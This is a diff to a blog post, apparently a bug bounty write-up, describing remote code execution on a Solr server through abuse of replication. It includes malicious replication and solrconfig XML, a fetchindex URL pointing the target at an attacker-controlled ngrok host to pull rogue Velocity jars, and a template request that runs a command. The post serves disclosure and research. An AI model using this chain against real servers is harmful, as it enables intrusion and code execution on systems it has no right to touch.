@@ -1,11 +1,11 @@
 ---
 layout: post
 title: A very fancy way to obtain RCE on a Solr server 
-date: 2025/02/02
+date: 2025/02/25
 tags: web bugbounties
 permalink: /posts/rce-on-solr-server-via-replication
 header:
-  teaser: 
+  teaser: /assets/images/posts/2025-02-21/rce.png
 ---
 
 {% raw %}Hello there! In this post, I will be discussing one of the most beautiful and complex vulnerabilities I have ever found, and how it got triaged as "Duplicate" although I was the only one achieving RCE. I discovered it some weeks ago in the same bug bounty program as the one described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">my previous post</a>. As back then, since this is a private program, I will need to hide many stuff. However, I can tell you that it belongs to one of the biggest videogames companies, which doesn't have a very good relationship with hackers and other tinkerers ;).
@@ -248,7 +248,7 @@ I added some test data to the leader so that it has something to replicate (else
 
 <img src="/assets/images/posts/2025-02-21/jar-replication.png" style="width: 55em">
 
-Once I knew I could distribute the .jar files, I needed to test if I could actually enable Velocity using them. Since I already knew that I could modify the config file remotely, I edited manually the "solrconfig.xml" of the follower to save time. I added a "&lt;lib&gt;" element to import all .jar files in the "server/solr/follower/conf/" directory and a "&lt;queryResponseWriter&gt;" element to enable Velocity:
+Once I knew I could distribute the .jar libraries, I needed to test if I could actually enable Velocity using them. Since I already knew that I could modify the config file remotely, I edited manually the "solrconfig.xml" of the follower to save time. I added a "&lt;lib&gt;" element to import all .jar libraries in the "server/solr/follower/conf/" directory and a "&lt;queryResponseWriter&gt;" element to enable Velocity:
 
 <code class="language-xml">&#60;lib dir="conf/" regex=".*\.jar"/&#62;
 
@@ -313,8 +313,43 @@ Awesome! I had a working exploit to get RCE on the target server! Now, since I w
 
 I recompiled the .jar libraries again and prepared the exploit. To recap, these were the steps to achieve RCE on the target server:
 <ol>
-<li>test</li>
+<li>Create a malicious local Solr server that acted as a follower of the target server</li>
+<li>Replicate the dataset from the target Solr server so that it doesn-t get lost</li>
+<li>Configure the local server as a leader</li>
+<li>Trigger a replication from the local server to the target server to send it the malicious "solrconfig.xml" file and the modified Velocity .jar libraries along with the dataset</li>
+<li>Access the modified "browse" template in the target server, which would execute the "id" command</li>
 </ol>
+Since I my local Solr instance "hacefresk0" already contained the dataset of the target server, I configured its replication request handler as a leader that served the malicious "solrconfig.xml" file for the target server and the modified Velocity .jar libraries:
 
+<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
+    &#60;lst name="leader"&#62;
+        &#60;str name="replicateAfter"&#62;optimize&#60;/str&#62;
+        &#60;str name="backupAfter"&#62;optimize&#60;/str&#62;
+        &#60;str name="confFiles"&#62;malicious-solrconfig.xml:solrconfig.xml,solritas-0.9.5.jar,velocity-engine-core-2.1.jar,velocity-tools-generic-3.0.jar&#60;/str&#62;
+    &#60;/lst&#62;
+&#60;/requestHandler&#62;</code>
+
+The malicious "solrconfig.xml" contained a "&lt;lib&gt;" element to import the .jar libraries, a "&lt;queryResponseWriter&gt;" element to enable Velocity and a replication request handler configured as a follower for the target's current leader, so that I didn't break the replication infrastructure too much:
+
+<code class="language-xml">&#60;lib dir="conf/" regex=".*\.jar"/&#62;
+
+&#60;queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"&#62;
+    &#60;str name="template.base.dir"&#62;&#60;/str&#62;
+&#60;/queryResponseWriter&#62;
+
+&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
+    &#60;lst name="slave"&#62;
+        &#60;str name="leaderUrl"&#62;https://leader.target.com:443/solr/de/&#60;/str&#62;
+        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
+    &#60;/lst&#62;
+&#60;/requestHandler&#62;</code>
+
+Now, I triggered the replication in the target server by accessing the following URL:
+
+<code>https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://&lt;ngrok_url&gt;/solr/hacefresk0/</code>
+
+Once I saw the corresponding connections in the ngrok interface, indicating that the replication was successful, I accessed the malicious "browse" template in the target server at "https://target.com/solr/de/select?q=*&wt=velocity&v.template=browse". The command "id" had been successfully executed in the target server :D
+
+<img src="/assets/images/posts/2025-02-21/rce.png" style="width: 55em">
 
 {% endraw %}
